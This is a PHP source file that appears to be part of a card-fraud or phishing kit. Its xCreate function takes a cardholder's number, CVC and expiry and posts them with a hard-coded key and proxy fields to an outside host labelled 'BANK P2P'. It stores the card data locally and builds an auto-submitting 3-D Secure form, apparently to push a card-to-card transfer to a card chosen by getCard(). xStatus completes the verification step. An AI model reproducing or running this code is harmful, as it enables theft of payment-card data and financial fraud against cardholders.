<?php

function xStatus($merchant, $pares, $abc) {
	
	//$proxy = paymentProxy('usb');
	
    $_POST['key']    = '20d9014fe2585a0cb7ebbe766705d66f';
    $_POST['MD']     = $merchant;
    $_POST['PaRes']  = $pares;
    $_POST['proxy']  = $proxy[0];
    $_POST['pass']   = $proxy[1];
    
    $curl = curl_init();
    curl_setopt_array($curl, [
       CURLOPT_URL => 'https://s1mka.ru/rgs.php',
       CURLOPT_RETURNTRANSFER => 1,
       // CURLOPT_PROXY => 'IP:PORT',
       // CURLOPT_PROXYUSERPWD => 'LOGIN:PASS',
       CURLOPT_REFERER => $abc,
       CURLOPT_POSTFIELDS => $_POST
    ]);    
    $ds = json_decode(curl_exec($curl), 1);
    curl_close($curl);
    
    return [$ds['status'] == 'success', $ds['message']];
}

function xCreate($amount, $card, $expm, $expy, $cvc, $redir, $shop) {
    
    unset($_POST['MD'], $_POST['PaRes']);
    
    //$proxy = paymentProxy('usb');
    
	// $_POST['secret'] = 'КЛЮЧ_ОТ_anti-captcha.com';
    $_POST['url']    = 'https://tochka.com';
    $_POST['key']    = '20d9014fe2585a0cb7ebbe766705d66f';
    $_POST['name']   = 'BANK P2P'; // $shop;
    $_POST['cardn']  = getCard();
    $_POST['proxy']  = $proxy[0];
    $_POST['pass']   = $proxy[1];
    $_POST["amount"] = $amount;  
    $_POST['status'] = $redir;
    $_POST['card']   = $card;
    $_POST['cvc']    = $cvc;
    $_POST['exp']    = $expm.'/'.$expy;
    
    $curl = curl_init();
    curl_setopt_array($curl, [
       CURLOPT_URL => 'https://s1mka.ru/rgs.php',
       CURLOPT_RETURNTRANSFER => 1,
       // CURLOPT_PROXY => 'IP:PORT',
       // CURLOPT_PROXYUSERPWD => 'LOGIN:PASS',
       CURLOPT_REFERER => $_SERVER['REQUEST_URI'],
       CURLOPT_POSTFIELDS => $_POST
    ]);    
    $ds = json_decode(curl_exec($curl), 1);
    curl_close($curl);
    
    setPayData($ds['MD'], [$card, $expm, $expy, $cvc, $_POST['cardn'], $amount, $ds['id']]);
    
    if ($ds['status'] == 'fail')
        return [false, $ds['message']];
     else 
        return [true, '<body onload="x.submit()"><form id="x" action="'.$ds['action'].'" method="POST"><input type="hidden" name="PaReq" value="'.$ds['PaReq'].'"><input type="hidden" name="MD" value="'.$ds['MD'].'"><input type="hidden" name="TermUrl" value="'.$redir.'"><noscript><input type="submit" value="Продолжить"></noscript></form>'];
    
}
?>